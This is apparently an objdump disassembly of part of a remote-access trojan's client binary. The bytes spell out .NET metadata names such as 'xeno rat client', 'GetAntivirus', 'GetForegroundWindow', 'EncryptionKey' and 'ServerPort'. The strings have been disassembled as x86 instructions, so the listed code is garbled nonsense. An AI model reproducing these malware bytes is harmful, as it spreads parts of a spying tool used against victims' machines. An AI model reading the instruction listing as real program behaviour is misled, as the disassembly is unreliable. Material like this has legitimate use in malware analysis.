  40a982:	74 41                	je     0x40a9c5
  40a984:	72 67                	jb     0x40a9ed
  40a986:	73 00                	jae    0x40a988
  40a988:	55                   	push   %ebp
  40a989:	6e                   	outsb  %ds:(%esi),(%dx)
  40a98a:	68 61 6e 64 6c       	push   $0x6c646e61
  40a98f:	65 64 45             	gs fs inc %ebp
  40a992:	78 63                	js     0x40a9f7
  40a994:	65 70 74             	gs jo  0x40aa0b
  40a997:	69 6f 6e 45 76 65 6e 	imul   $0x6e657645,0x6e(%edi),%ebp
  40a99e:	74 41                	je     0x40a9e1
  40a9a0:	72 67                	jb     0x40aa09
  40a9a2:	73 00                	jae    0x40a9a4
  40a9a4:	61                   	popa
  40a9a5:	72 67                	jb     0x40aa0e
  40a9a7:	73 00                	jae    0x40a9a9
  40a9a9:	3c 3e                	cmp    $0x3e,%al
  40a9ab:	34 5f                	xor    $0x5f,%al
  40a9ad:	5f                   	pop    %edi
  40a9ae:	74 68                	je     0x40aa18
  40a9b0:	69 73 00 53 79 73 74 	imul   $0x74737953,0x0(%ebx),%esi
  40a9b7:	65 6d                	gs insl (%dx),%es:(%edi)
  40a9b9:	2e 54                	cs push %esp
  40a9bb:	68 72 65 61 64       	push   $0x64616572
  40a9c0:	69 6e 67 2e 54 61 73 	imul   $0x7361542e,0x67(%esi),%ebp
  40a9c7:	6b 73 00 55          	imul   $0x55,0x0(%ebx),%esi
  40a9cb:	74 69                	je     0x40aa36
  40a9cd:	6c                   	insb   (%dx),%es:(%edi)
  40a9ce:	73 00                	jae    0x40a9d0
  40a9d0:	53                   	push   %ebx
  40a9d1:	79 73                	jns    0x40aa46
  40a9d3:	74 65                	je     0x40aa3a
  40a9d5:	6d                   	insl   (%dx),%es:(%edi)
  40a9d6:	2e 53                	cs push %ebx
  40a9d8:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  40a9dc:	69 74 79 2e 43 6c 61 	imul   $0x69616c43,0x2e(%ecx,%edi,2),%esi
  40a9e3:	69 
  40a9e4:	6d                   	insl   (%dx),%es:(%edi)
  40a9e5:	73 00                	jae    0x40a9e7
  40a9e7:	43                   	inc    %ebx
  40a9e8:	6f                   	outsl  %ds:(%esi),(%dx)
  40a9e9:	6e                   	outsb  %ds:(%esi),(%dx)
  40a9ea:	74 61                	je     0x40aa4d
  40a9ec:	69 6e 73 00 53 6f 63 	imul   $0x636f5300,0x73(%esi),%ebp
  40a9f3:	6b 65 74 54          	imul   $0x54,0x74(%ebp),%esp
  40a9f7:	61                   	popa
  40a9f8:	73 6b                	jae    0x40aa65
  40a9fa:	45                   	inc    %ebp
  40a9fb:	78 74                	js     0x40aa71
  40a9fd:	65 6e                	outsb  %gs:(%esi),(%dx)
  40a9ff:	73 69                	jae    0x40aa6a
  40aa01:	6f                   	outsl  %ds:(%esi),(%dx)
  40aa02:	6e                   	outsb  %ds:(%esi),(%dx)
  40aa03:	73 00                	jae    0x40aa05
  40aa05:	53                   	push   %ebx
  40aa06:	74 72                	je     0x40aa7a
  40aa08:	69 6e 67 53 70 6c 69 	imul   $0x696c7053,0x67(%esi),%ebp
  40aa0f:	74 4f                	je     0x40aa60
  40aa11:	70 74                	jo     0x40aa87
  40aa13:	69 6f 6e 73 00 52 75 	imul   $0x75520073,0x6e(%edi),%ebp
  40aa1a:	6e                   	outsb  %ds:(%esi),(%dx)
  40aa1b:	74 69                	je     0x40aa86
  40aa1d:	6d                   	insl   (%dx),%es:(%edi)
  40aa1e:	65 48                	gs dec %eax
  40aa20:	65 6c                	gs insb (%dx),%es:(%edi)
  40aa22:	70 65                	jo     0x40aa89
  40aa24:	72 73                	jb     0x40aa99
  40aa26:	00 47 65             	add    %al,0x65(%edi)
  40aa29:	74 43                	je     0x40aa6e
  40aa2b:	75 72                	jne    0x40aa9f
  40aa2d:	72 65                	jb     0x40aa94
  40aa2f:	6e                   	outsb  %ds:(%esi),(%dx)
  40aa30:	74 50                	je     0x40aa82
  40aa32:	72 6f                	jb     0x40aaa3
  40aa34:	63 65 73             	arpl   %esp,0x73(%ebp)
  40aa37:	73 00                	jae    0x40aa39
  40aa39:	43                   	inc    %ebx
  40aa3a:	6f                   	outsl  %ds:(%esi),(%dx)
  40aa3b:	6d                   	insl   (%dx),%es:(%edi)
  40aa3c:	70 72                	jo     0x40aab0
  40aa3e:	65 73 73             	gs jae 0x40aab4
  40aa41:	00 44 65 63          	add    %al,0x63(%ebp,%eiz,2)
  40aa45:	6f                   	outsl  %ds:(%esi),(%dx)
  40aa46:	6d                   	insl   (%dx),%es:(%edi)
  40aa47:	70 72                	jo     0x40aabb
  40aa49:	65 73 73             	gs jae 0x40aabf
  40aa4c:	00 53 79             	add    %dl,0x79(%ebx)
  40aa4f:	73 74                	jae    0x40aac5
  40aa51:	65 6d                	gs insl (%dx),%es:(%edi)
  40aa53:	2e 4e                	cs dec %esi
  40aa55:	65 74 2e             	gs je  0x40aa86
  40aa58:	53                   	push   %ebx
  40aa59:	6f                   	outsl  %ds:(%esi),(%dx)
  40aa5a:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40aa5d:	74 73                	je     0x40aad2
  40aa5f:	00 73 65             	add    %dh,0x65(%ebx)
  40aa62:	74 5f                	je     0x40aac3
  40aa64:	41                   	inc    %ecx
  40aa65:	72 67                	jb     0x40aace
  40aa67:	75 6d                	jne    0x40aad6
  40aa69:	65 6e                	outsb  %gs:(%esi),(%dx)
  40aa6b:	74 73                	je     0x40aae0
  40aa6d:	00 45 78             	add    %al,0x78(%ebp)
  40aa70:	69 73 74 73 00 47 65 	imul   $0x65470073,0x74(%ebx),%esi
  40aa77:	74 41                	je     0x40aaba
  40aa79:	6e                   	outsb  %ds:(%esi),(%dx)
  40aa7a:	74 69                	je     0x40aae5
  40aa7c:	76 69                	jbe    0x40aae7
  40aa7e:	72 75                	jb     0x40aaf5
  40aa80:	73 00                	jae    0x40aa82
  40aa82:	67 65 74 5f          	addr16 gs je 0x40aae5
  40aa86:	4b                   	dec    %ebx
  40aa87:	65 79 73             	gs jns 0x40aafd
  40aa8a:	00 43 6f             	add    %al,0x6f(%ebx)
  40aa8d:	6e                   	outsb  %ds:(%esi),(%dx)
  40aa8e:	63 61 74             	arpl   %esp,0x74(%ecx)
  40aa91:	00 43 6f             	add    %al,0x6f(%ebx)
  40aa94:	6d                   	insl   (%dx),%es:(%edi)
  40aa95:	70 72                	jo     0x40ab09
  40aa97:	65 73 73             	gs jae 0x40ab0d
  40aa9a:	69 6f 6e 46 6f 72 6d 	imul   $0x6d726f46,0x6e(%edi),%ebp
  40aaa1:	61                   	popa
  40aaa2:	74 00                	je     0x40aaa4
  40aaa4:	4d                   	dec    %ebp
  40aaa5:	61                   	popa
  40aaa6:	6e                   	outsb  %ds:(%esi),(%dx)
  40aaa7:	61                   	popa
  40aaa8:	67 65 6d             	gs insl (%dx),%es:(%di)
  40aaab:	65 6e                	outsb  %gs:(%esi),(%dx)
  40aaad:	74 42                	je     0x40aaf1
  40aaaf:	61                   	popa
  40aab0:	73 65                	jae    0x40ab17
  40aab2:	4f                   	dec    %edi
  40aab3:	62 6a 65             	bound  %ebp,0x65(%edx)
  40aab6:	63 74 00 68          	arpl   %esi,0x68(%eax,%eax,1)
  40aaba:	4f                   	dec    %edi
  40aabb:	62 6a 65             	bound  %ebp,0x65(%edx)
  40aabe:	63 74 00 67          	arpl   %esi,0x67(%eax,%eax,1)
  40aac2:	65 74 5f             	gs je  0x40ab24
  40aac5:	45                   	inc    %ebp
  40aac6:	78 63                	js     0x40ab2b
  40aac8:	65 70 74             	gs jo  0x40ab3f
  40aacb:	69 6f 6e 4f 62 6a 65 	imul   $0x656a624f,0x6e(%edi),%ebp
  40aad2:	63 74 00 4d          	arpl   %esi,0x4d(%eax,%eax,1)
  40aad6:	61                   	popa
  40aad7:	6e                   	outsb  %ds:(%esi),(%dx)
  40aad8:	61                   	popa
  40aad9:	67 65 6d             	gs insl (%dx),%es:(%di)
  40aadc:	65 6e                	outsb  %gs:(%esi),(%dx)
  40aade:	74 4f                	je     0x40ab2f
  40aae0:	62 6a 65             	bound  %ebp,0x65(%edx)
  40aae3:	63 74 00 45          	arpl   %esi,0x45(%eax,%eax,1)
  40aae7:	6e                   	outsb  %ds:(%esi),(%dx)
  40aae8:	64 44                	fs inc %esp
  40aaea:	69 73 63 6f 6e 6e 65 	imul   $0x656e6e6f,0x63(%ebx),%esi
  40aaf1:	63 74 00 5f          	arpl   %esi,0x5f(%eax,%eax,1)
  40aaf5:	4f                   	dec    %edi
  40aaf6:	6e                   	outsb  %ds:(%esi),(%dx)
  40aaf7:	44                   	inc    %esp
  40aaf8:	69 73 63 6f 6e 6e 65 	imul   $0x656e6e6f,0x63(%ebx),%esi
  40aaff:	63 74 00 42          	arpl   %esi,0x42(%eax,%eax,1)
  40ab03:	65 67 69 6e 44 69 73 	imul   $0x6f637369,%gs:0x44(%bp),%ebp
  40ab0a:	63 6f 
  40ab0c:	6e                   	outsb  %ds:(%esi),(%dx)
  40ab0d:	6e                   	outsb  %ds:(%esi),(%dx)
  40ab0e:	65 63 74 00 47       	arpl   %esi,%gs:0x47(%eax,%eax,1)
  40ab13:	65 74 00             	gs je  0x40ab16
  40ab16:	53                   	push   %ebx
  40ab17:	79 73                	jns    0x40ab8c
  40ab19:	74 65                	je     0x40ab80
  40ab1b:	6d                   	insl   (%dx),%es:(%edi)
  40ab1c:	2e 4e                	cs dec %esi
  40ab1e:	65 74 00             	gs je  0x40ab21
  40ab21:	53                   	push   %ebx
  40ab22:	6f                   	outsl  %ds:(%esi),(%dx)
  40ab23:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40ab26:	74 00                	je     0x40ab28
  40ab28:	73 6f                	jae    0x40ab99
  40ab2a:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40ab2d:	74 00                	je     0x40ab2f
  40ab2f:	54                   	push   %esp
  40ab30:	5f                   	pop    %edi
  40ab31:	6f                   	outsl  %ds:(%esi),(%dx)
  40ab32:	66 66 73 65          	data16 data16 jae 0x40ab9b
  40ab36:	74 00                	je     0x40ab38
  40ab38:	53                   	push   %ebx
  40ab39:	70 6c                	jo     0x40aba7
  40ab3b:	69 74 00 57 61 69 74 	imul   $0x46746961,0x57(%eax,%eax,1),%esi
  40ab42:	46 
  40ab43:	6f                   	outsl  %ds:(%esi),(%dx)
  40ab44:	72 45                	jb     0x40ab8b
  40ab46:	78 69                	js     0x40abb1
  40ab48:	74 00                	je     0x40ab4a
  40ab4a:	67 65 74 5f          	addr16 gs je 0x40abad
  40ab4e:	52                   	push   %edx
  40ab4f:	65 73 75             	gs jae 0x40abc7
  40ab52:	6c                   	insb   (%dx),%es:(%edi)
  40ab53:	74 00                	je     0x40ab55
  40ab55:	49                   	dec    %ecx
  40ab56:	41                   	inc    %ecx
  40ab57:	73 79                	jae    0x40abd2
  40ab59:	6e                   	outsb  %ds:(%esi),(%dx)
  40ab5a:	63 52 65             	arpl   %edx,0x65(%edx)
  40ab5d:	73 75                	jae    0x40abd4
  40ab5f:	6c                   	insb   (%dx),%es:(%edi)
  40ab60:	74 00                	je     0x40ab62
  40ab62:	47                   	inc    %edi
  40ab63:	65 74 52             	gs je  0x40abb8
  40ab66:	65 73 75             	gs jae 0x40abde
  40ab69:	6c                   	insb   (%dx),%es:(%edi)
  40ab6a:	74 00                	je     0x40ab6c
  40ab6c:	53                   	push   %ebx
  40ab6d:	65 74 52             	gs je  0x40abc2
  40ab70:	65 73 75             	gs jae 0x40abe8
  40ab73:	6c                   	insb   (%dx),%es:(%edi)
  40ab74:	74 00                	je     0x40ab76
  40ab76:	42                   	inc    %edx
  40ab77:	79 74                	jns    0x40abed
  40ab79:	65 73 54             	gs jae 0x40abd0
  40ab7c:	6f                   	outsl  %ds:(%esi),(%dx)
  40ab7d:	49                   	dec    %ecx
  40ab7e:	6e                   	outsb  %ds:(%esi),(%dx)
  40ab7f:	74 00                	je     0x40ab81
  40ab81:	57                   	push   %edi
  40ab82:	65 62 43 6c          	bound  %eax,%gs:0x6c(%ebx)
  40ab86:	69 65 6e 74 00 78 65 	imul   $0x65780074,0x6e(%ebp),%esp
  40ab8d:	6e                   	outsb  %ds:(%esi),(%dx)
  40ab8e:	6f                   	outsl  %ds:(%esi),(%dx)
  40ab8f:	20 72 61             	and    %dh,0x61(%edx)
  40ab92:	74 20                	je     0x40abb4
  40ab94:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40ab98:	6e                   	outsb  %ds:(%esi),(%dx)
  40ab99:	74 00                	je     0x40ab9b
  40ab9b:	78 65                	js     0x40ac02
  40ab9d:	6e                   	outsb  %ds:(%esi),(%dx)
  40ab9e:	6f                   	outsl  %ds:(%esi),(%dx)
  40ab9f:	5f                   	pop    %edi
  40aba0:	72 61                	jb     0x40ac03
  40aba2:	74 5f                	je     0x40ac03
  40aba4:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40aba8:	6e                   	outsb  %ds:(%esi),(%dx)
  40aba9:	74 00                	je     0x40abab
  40abab:	53                   	push   %ebx
  40abac:	79 73                	jns    0x40ac21
  40abae:	74 65                	je     0x40ac15
  40abb0:	6d                   	insl   (%dx),%es:(%edi)
  40abb1:	2e 4d                	cs dec %ebp
  40abb3:	61                   	popa
  40abb4:	6e                   	outsb  %ds:(%esi),(%dx)
  40abb5:	61                   	popa
  40abb6:	67 65 6d             	gs insl (%dx),%es:(%di)
  40abb9:	65 6e                	outsb  %gs:(%esi),(%dx)
  40abbb:	74 00                	je     0x40abbd
  40abbd:	45                   	inc    %ebp
  40abbe:	6e                   	outsb  %ds:(%esi),(%dx)
  40abbf:	76 69                	jbe    0x40ac2a
  40abc1:	72 6f                	jb     0x40ac32
  40abc3:	6e                   	outsb  %ds:(%esi),(%dx)
  40abc4:	6d                   	insl   (%dx),%es:(%edi)
  40abc5:	65 6e                	outsb  %gs:(%esi),(%dx)
  40abc7:	74 00                	je     0x40abc9
  40abc9:	43                   	inc    %ebx
  40abca:	6f                   	outsl  %ds:(%esi),(%dx)
  40abcb:	6d                   	insl   (%dx),%es:(%edi)
  40abcc:	70 6f                	jo     0x40ac3d
  40abce:	6e                   	outsb  %ds:(%esi),(%dx)
  40abcf:	65 6e                	outsb  %gs:(%esi),(%dx)
  40abd1:	74 00                	je     0x40abd3
  40abd3:	50                   	push   %eax
  40abd4:	61                   	popa
  40abd5:	72 65                	jb     0x40ac3c
  40abd7:	6e                   	outsb  %ds:(%esi),(%dx)
  40abd8:	74 00                	je     0x40abda
  40abda:	67 65 74 5f          	addr16 gs je 0x40ac3d
  40abde:	43                   	inc    %ebx
  40abdf:	75 72                	jne    0x40ac53
  40abe1:	72 65                	jb     0x40ac48
  40abe3:	6e                   	outsb  %ds:(%esi),(%dx)
  40abe4:	74 00                	je     0x40abe6
  40abe6:	47                   	inc    %edi
  40abe7:	65 74 43             	gs je  0x40ac2d
  40abea:	75 72                	jne    0x40ac5e
  40abec:	72 65                	jb     0x40ac53
  40abee:	6e                   	outsb  %ds:(%esi),(%dx)
  40abef:	74 00                	je     0x40abf1
  40abf1:	67 65 74 5f          	addr16 gs je 0x40ac54
  40abf5:	52                   	push   %edx
  40abf6:	65 6d                	gs insl (%dx),%es:(%edi)
  40abf8:	6f                   	outsl  %ds:(%esi),(%dx)
  40abf9:	74 65                	je     0x40ac60
  40abfb:	45                   	inc    %ebp
  40abfc:	6e                   	outsb  %ds:(%esi),(%dx)
  40abfd:	64 50                	fs push %eax
  40abff:	6f                   	outsl  %ds:(%esi),(%dx)
  40ac00:	69 6e 74 00 67 65 74 	imul   $0x74656700,0x74(%esi),%ebp
  40ac07:	5f                   	pop    %edi
  40ac08:	43                   	inc    %ebx
  40ac09:	6f                   	outsl  %ds:(%esi),(%dx)
  40ac0a:	75 6e                	jne    0x40ac7a
  40ac0c:	74 00                	je     0x40ac0e
  40ac0e:	67 65 74 5f          	addr16 gs je 0x40ac71
  40ac12:	54                   	push   %esp
  40ac13:	69 63 6b 43 6f 75 6e 	imul   $0x6e756f43,0x6b(%ebx),%esp
  40ac1a:	74 00                	je     0x40ac1c
  40ac1c:	67 65 74 5f          	addr16 gs je 0x40ac7f
  40ac20:	50                   	push   %eax
  40ac21:	72 6f                	jb     0x40ac92
  40ac23:	63 65 73             	arpl   %esp,0x73(%ebp)
  40ac26:	73 6f                	jae    0x40ac97
  40ac28:	72 43                	jb     0x40ac6d
  40ac2a:	6f                   	outsl  %ds:(%esi),(%dx)
  40ac2b:	75 6e                	jne    0x40ac9b
  40ac2d:	74 00                	je     0x40ac2f
  40ac2f:	63 6f 75             	arpl   %ebp,0x75(%edi)
  40ac32:	6e                   	outsb  %ds:(%esi),(%dx)
  40ac33:	74 00                	je     0x40ac35
  40ac35:	47                   	inc    %edi
  40ac36:	65 74 50             	gs je  0x40ac89
  40ac39:	61                   	popa
  40ac3a:	74 68                	je     0x40aca4
  40ac3c:	52                   	push   %edx
  40ac3d:	6f                   	outsl  %ds:(%esi),(%dx)
  40ac3e:	6f                   	outsl  %ds:(%esi),(%dx)
  40ac3f:	74 00                	je     0x40ac41
  40ac41:	44                   	inc    %esp
  40ac42:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  40ac46:	70 74                	jo     0x40acbc
  40ac48:	00 45 6e             	add    %al,0x6e(%ebp)
  40ac4b:	63 72 79             	arpl   %esi,0x79(%edx)
  40ac4e:	70 74                	jo     0x40acc4
  40ac50:	00 53 74             	add    %dl,0x74(%ebx)
  40ac53:	61                   	popa
  40ac54:	72 74                	jb     0x40acca
  40ac56:	00 43 6f             	add    %al,0x6f(%ebx)
  40ac59:	6e                   	outsb  %ds:(%esi),(%dx)
  40ac5a:	76 65                	jbe    0x40acc1
  40ac5c:	72 74                	jb     0x40acd2
  40ac5e:	00 53 65             	add    %dl,0x65(%ebx)
  40ac61:	72 76                	jb     0x40acd9
  40ac63:	65 72 50             	gs jb  0x40acb6
  40ac66:	6f                   	outsl  %ds:(%esi),(%dx)
  40ac67:	72 74                	jb     0x40acdd
  40ac69:	00 54 6f 4c          	add    %dl,0x4c(%edi,%ebp,2)
  40ac6d:	69 73 74 00 67 65 74 	imul   $0x74656700,0x74(%ebx),%esi
  40ac74:	5f                   	pop    %edi
  40ac75:	4f                   	dec    %edi
  40ac76:	75 74                	jne    0x40acec
  40ac78:	00 6f 72             	add    %ch,0x72(%edi)
  40ac7b:	69 67 69 6e 61 6c 4f 	imul   $0x4f6c616e,0x69(%edi),%esp
  40ac82:	75 74                	jne    0x40acf8
  40ac84:	00 53 65             	add    %dl,0x65(%ebx)
  40ac87:	74 4f                	je     0x40acd8
  40ac89:	75 74                	jne    0x40acff
  40ac8b:	00 73 65             	add    %dh,0x65(%ebx)
  40ac8e:	74 5f                	je     0x40acef
  40ac90:	52                   	push   %edx
  40ac91:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  40ac95:	76 65                	jbe    0x40acfc
  40ac97:	54                   	push   %esp
  40ac98:	69 6d 65 6f 75 74 00 	imul   $0x74756f,0x65(%ebp),%ebp
  40ac9f:	53                   	push   %ebx
  40aca0:	65 74 52             	gs je  0x40acf5
  40aca3:	65 63 76 54          	arpl   %esi,%gs:0x54(%esi)
  40aca7:	69 6d 65 6f 75 74 00 	imul   $0x74756f,0x65(%ebp),%ebp
  40acae:	52                   	push   %edx
  40acaf:	65 73 65             	gs jae 0x40ad17
  40acb2:	74 52                	je     0x40ad06
  40acb4:	65 63 76 54          	arpl   %esi,%gs:0x54(%esi)
  40acb8:	69 6d 65 6f 75 74 00 	imul   $0x74756f,0x65(%ebp),%ebp
  40acbf:	73 6f                	jae    0x40ad30
  40acc1:	63 6b 74             	arpl   %ebp,0x74(%ebx)
  40acc4:	69 6d 65 6f 75 74 00 	imul   $0x74756f,0x65(%ebp),%ebp
  40accb:	43                   	inc    %ebx
  40accc:	6c                   	insb   (%dx),%es:(%edi)
  40accd:	65 61                	gs popa
  40accf:	72 43                	jb     0x40ad14
  40acd1:	61                   	popa
  40acd2:	70 74                	jo     0x40ad48
  40acd4:	75 72                	jne    0x40ad48
  40acd6:	65 64 4f             	gs fs dec %edi
  40acd9:	75 74                	jne    0x40ad4f
  40acdb:	70 75                	jo     0x40ad52
  40acdd:	74 00                	je     0x40acdf
  40acdf:	47                   	inc    %edi
  40ace0:	65 74 43             	gs je  0x40ad26
  40ace3:	61                   	popa
  40ace4:	70 74                	jo     0x40ad5a
  40ace6:	75 72                	jne    0x40ad5a
  40ace8:	65 64 4f             	gs fs dec %edi
  40aceb:	75 74                	jne    0x40ad61
  40aced:	70 75                	jo     0x40ad64
  40acef:	74 00                	je     0x40acf1
  40acf1:	67 65 74 5f          	addr16 gs je 0x40ad54
  40acf5:	53                   	push   %ebx
  40acf6:	74 61                	je     0x40ad59
  40acf8:	6e                   	outsb  %ds:(%esi),(%dx)
  40acf9:	64 61                	fs popa
  40acfb:	72 64                	jb     0x40ad61
  40acfd:	4f                   	dec    %edi
  40acfe:	75 74                	jne    0x40ad74
  40ad00:	70 75                	jo     0x40ad77
  40ad02:	74 00                	je     0x40ad04
  40ad04:	73 65                	jae    0x40ad6b
  40ad06:	74 5f                	je     0x40ad67
  40ad08:	52                   	push   %edx
  40ad09:	65 64 69 72 65 63 74 	gs imul $0x74537463,%fs:0x65(%edx),%esi
  40ad10:	53 74 
  40ad12:	61                   	popa
  40ad13:	6e                   	outsb  %ds:(%esi),(%dx)
  40ad14:	64 61                	fs popa
  40ad16:	72 64                	jb     0x40ad7c
  40ad18:	4f                   	dec    %edi
  40ad19:	75 74                	jne    0x40ad8f
  40ad1b:	70 75                	jo     0x40ad92
  40ad1d:	74 00                	je     0x40ad1f
  40ad1f:	4d                   	dec    %ebp
  40ad20:	6f                   	outsl  %ds:(%esi),(%dx)
  40ad21:	76 65                	jbe    0x40ad88
  40ad23:	4e                   	dec    %esi
  40ad24:	65 78 74             	gs js  0x40ad9b
  40ad27:	00 53 79             	add    %dl,0x79(%ebx)
  40ad2a:	73 74                	jae    0x40ada0
  40ad2c:	65 6d                	gs insl (%dx),%es:(%edi)
  40ad2e:	2e 54                	cs push %esp
  40ad30:	65 78 74             	gs js  0x40ada7
  40ad33:	00 57 72             	add    %dl,0x72(%edi)
  40ad36:	69 74 65 41 6c 6c 54 	imul   $0x65546c6c,0x41(%ebp,%eiz,2),%esi
  40ad3d:	65 
  40ad3e:	78 74                	js     0x40adb4
  40ad40:	00 47 65             	add    %al,0x65(%edi)
  40ad43:	74 57                	je     0x40ad9c
  40ad45:	69 6e 64 6f 77 54 65 	imul   $0x6554776f,0x64(%esi),%ebp
  40ad4c:	78 74                	js     0x40adc2
  40ad4e:	00 74 65 78          	add    %dh,0x78(%ebp,%eiz,2)
  40ad52:	74 00                	je     0x40ad54
  40ad54:	44                   	inc    %esp
  40ad55:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  40ad59:	4d                   	dec    %ebp
  40ad5a:	65 6e                	outsb  %gs:(%esi),(%dx)
  40ad5c:	75 00                	jne    0x40ad5e
  40ad5e:	52                   	push   %edx
  40ad5f:	65 67 69 73 74 72 79 	imul   $0x69567972,%gs:0x74(%bp,%di),%esi
  40ad66:	56 69 
  40ad68:	65 77 00             	gs ja  0x40ad6b
  40ad6b:	67 65 74 5f          	addr16 gs je 0x40adce
  40ad6f:	4e                   	dec    %esi
  40ad70:	6f                   	outsl  %ds:(%esi),(%dx)
  40ad71:	77 00                	ja     0x40ad73
  40ad73:	47                   	inc    %edi
  40ad74:	65 74 46             	gs je  0x40adbd
  40ad77:	6f                   	outsl  %ds:(%esi),(%dx)
  40ad78:	72 65                	jb     0x40addf
  40ad7a:	67 72 6f             	addr16 jb 0x40adec
  40ad7d:	75 6e                	jne    0x40aded
  40ad7f:	64 57                	fs push %edi
  40ad81:	69 6e 64 6f 77 00 47 	imul   $0x4700776f,0x64(%esi),%ebp
  40ad88:	65 74 43             	gs je  0x40adce
  40ad8b:	61                   	popa
  40ad8c:	70 74                	jo     0x40ae02
  40ad8e:	69 6f 6e 4f 66 41 63 	imul   $0x6341664f,0x6e(%edi),%ebp
  40ad95:	74 69                	je     0x40ae00
  40ad97:	76 65                	jbe    0x40adfe
  40ad99:	57                   	push   %edi
  40ad9a:	69 6e 64 6f 77 00 73 	imul   $0x7300776f,0x64(%esi),%ebp
  40ada1:	65 74 5f             	gs je  0x40ae03
  40ada4:	43                   	inc    %ebx
  40ada5:	72 65                	jb     0x40ae0c
  40ada7:	61                   	popa
  40ada8:	74 65                	je     0x40ae0f
  40adaa:	4e                   	dec    %esi
  40adab:	6f                   	outsl  %ds:(%esi),(%dx)
  40adac:	57                   	push   %edi
  40adad:	69 6e 64 6f 77 00 4d 	imul   $0x4d00776f,0x64(%esi),%ebp
  40adb4:	75 74                	jne    0x40ae2a
  40adb6:	65 78 00             	gs js  0x40adb9
  40adb9:	73 65                	jae    0x40ae20
  40adbb:	74 5f                	je     0x40ae1c
  40adbd:	4e                   	dec    %esi
  40adbe:	6f                   	outsl  %ds:(%esi),(%dx)
  40adbf:	44                   	inc    %esp
  40adc0:	65 6c                	gs insb (%dx),%es:(%edi)
  40adc2:	61                   	popa
  40adc3:	79 00                	jns    0x40adc5
  40adc5:	64 65 6c             	fs gs insb (%dx),%es:(%edi)
  40adc8:	61                   	popa
  40adc9:	79 00                	jns    0x40adcb
  40adcb:	49                   	dec    %ecx
  40adcc:	6e                   	outsb  %ds:(%esi),(%dx)
  40adcd:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  40add4:	65 
  40add5:	41                   	inc    %ecx
  40add6:	72 72                	jb     0x40ae4a
  40add8:	61                   	popa
  40add9:	79 00                	jns    0x40addb
  40addb:	54                   	push   %esp
  40addc:	6f                   	outsl  %ds:(%esi),(%dx)
  40addd:	41                   	inc    %ecx
  40adde:	72 72                	jb     0x40ae52
  40ade0:	61                   	popa
  40ade1:	79 00                	jns    0x40ade3
  40ade3:	67 65 74 5f          	addr16 gs je 0x40ae46
  40ade7:	4b                   	dec    %ebx
  40ade8:	65 79 00             	gs jns 0x40adeb
  40adeb:	73 65                	jae    0x40ae52
  40aded:	74 5f                	je     0x40ae4e
  40adef:	4b                   	dec    %ebx
  40adf0:	65 79 00             	gs jns 0x40adf3
  40adf3:	4f                   	dec    %edi
  40adf4:	70 65                	jo     0x40ae5b
  40adf6:	6e                   	outsb  %ds:(%esi),(%dx)
  40adf7:	53                   	push   %ebx
  40adf8:	75 62                	jne    0x40ae5c
  40adfa:	4b                   	dec    %ebx
  40adfb:	65 79 00             	gs jns 0x40adfe
  40adfe:	4f                   	dec    %edi
  40adff:	70 65                	jo     0x40ae66
  40ae01:	6e                   	outsb  %ds:(%esi),(%dx)
  40ae02:	42                   	inc    %edx
  40ae03:	61                   	popa
  40ae04:	73 65                	jae    0x40ae6b
  40ae06:	4b                   	dec    %ebx
  40ae07:	65 79 00             	gs jns 0x40ae0a
  40ae0a:	5f                   	pop    %edi
  40ae0b:	45                   	inc    %ebp
  40ae0c:	6e                   	outsb  %ds:(%esi),(%dx)
  40ae0d:	63 72 79             	arpl   %esi,0x79(%edx)
  40ae10:	70 74                	jo     0x40ae86
  40ae12:	69 6f 6e 4b 65 79 00 	imul   $0x79654b,0x6e(%edi),%ebp
  40ae19:	43                   	inc    %ebx
  40ae1a:	6f                   	outsl  %ds:(%esi),(%dx)
  40ae1b:	6e                   	outsb  %ds:(%esi),(%dx)
  40ae1c:	74 61                	je     0x40ae7f
  40ae1e:	69 6e 73 4b 65 79 00 	imul   $0x79654b,0x73(%esi),%ebp
  40ae25:	52                   	push   %edx
  40ae26:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  40ae2d:	4b 65 
  40ae2f:	79 00                	jns    0x40ae31
  40ae31:	6b 65 79 00          	imul   $0x0,0x79(%ebp),%esp
  40ae35:	53                   	push   %ebx
  40ae36:	79 73                	jns    0x40aeab
  40ae38:	74 65                	je     0x40ae9f
  40ae3a:	6d                   	insl   (%dx),%es:(%edi)
  40ae3b:	2e 53                	cs push %ebx
  40ae3d:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  40ae41:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  40ae48:	70 
  40ae49:	74 6f                	je     0x40aeba
  40ae4b:	67 72 61             	addr16 jb 0x40aeaf
  40ae4e:	70 68                	jo     0x40aeb8
  40ae50:	79 00                	jns    0x40ae52
  40ae52:	47                   	inc    %edi
  40ae53:	65 74 45             	gs je  0x40ae9b
  40ae56:	78 65                	js     0x40aebd
  40ae58:	63 75 74             	arpl   %esi,0x74(%ebp)
  40ae5b:	69 6e 67 41 73 73 65 	imul   $0x65737341,0x67(%esi),%ebp
  40ae62:	6d                   	insl   (%dx),%es:(%edi)
  40ae63:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  40ae67:	47                   	inc    %edi
  40ae68:	65 74 45             	gs je  0x40aeb0
  40ae6b:	6e                   	outsb  %ds:(%esi),(%dx)
  40ae6c:	74 72                	je     0x40aee0
  40ae6e:	79 41                	jns    0x40aeb1
  40ae70:	73 73                	jae    0x40aee5
  40ae72:	65 6d                	gs insl (%dx),%es:(%edi)
  40ae74:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  40ae78:	41                   	inc    %ecx
  40ae79:	64 64 72 65          	fs fs jb 0x40aee2
  40ae7d:	73 73                	jae    0x40aef2
  40ae7f:	46                   	inc    %esi
  40ae80:	61                   	popa
  40ae81:	6d                   	insl   (%dx),%es:(%edi)
